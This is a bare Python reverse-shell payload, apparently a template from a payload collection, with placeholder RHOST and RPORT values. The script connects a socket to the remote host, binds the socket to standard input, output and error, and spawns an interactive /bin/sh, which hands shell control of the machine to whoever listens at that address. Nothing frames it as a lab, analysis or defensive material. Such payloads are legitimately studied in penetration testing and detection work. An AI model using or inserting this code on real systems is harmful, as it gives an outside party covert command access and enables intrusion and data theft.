import sys,socket,os,pty

s=socket.socket()
s.connect(("RHOST",int("RPORT")))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
